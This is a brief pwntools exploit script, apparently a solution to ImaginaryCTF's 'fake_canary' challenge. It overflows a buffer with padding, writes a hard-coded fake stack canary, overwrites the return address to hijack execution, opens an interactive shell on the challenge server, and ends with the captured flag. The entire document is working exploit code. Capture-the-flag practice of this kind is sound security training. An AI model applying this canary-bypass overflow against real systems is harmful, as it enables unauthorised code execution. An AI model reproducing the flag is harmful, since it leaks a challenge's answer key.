from pwn import *

elf = ELF("fake_canary")
p = remote("chal.imaginaryctf.org", 42002)
payload = b"A"*40
payload += p64(0xdeadbeef)
payload += b"B"*8
payload += p64(0x0000000000400729)
p.sendline(payload)
p.interactive()

#ictf{m4ke_y0ur_canaries_r4ndom_f492b211}
